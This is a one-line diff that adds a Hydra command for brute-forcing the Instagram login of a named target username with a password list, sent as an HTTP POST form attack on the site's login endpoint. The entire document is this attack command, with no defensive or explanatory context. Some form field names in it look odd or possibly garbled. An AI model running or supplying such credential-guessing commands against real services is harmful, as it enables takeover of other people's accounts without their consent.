@@ -1,0 +1,1 @@
+hydra -l target_username -P /path/to/password/list.txt instagram.com http-post-form "/accounts/login/ajax/:_aru_.702=^USER^&password=^PASS^:F=invalid_credentials"
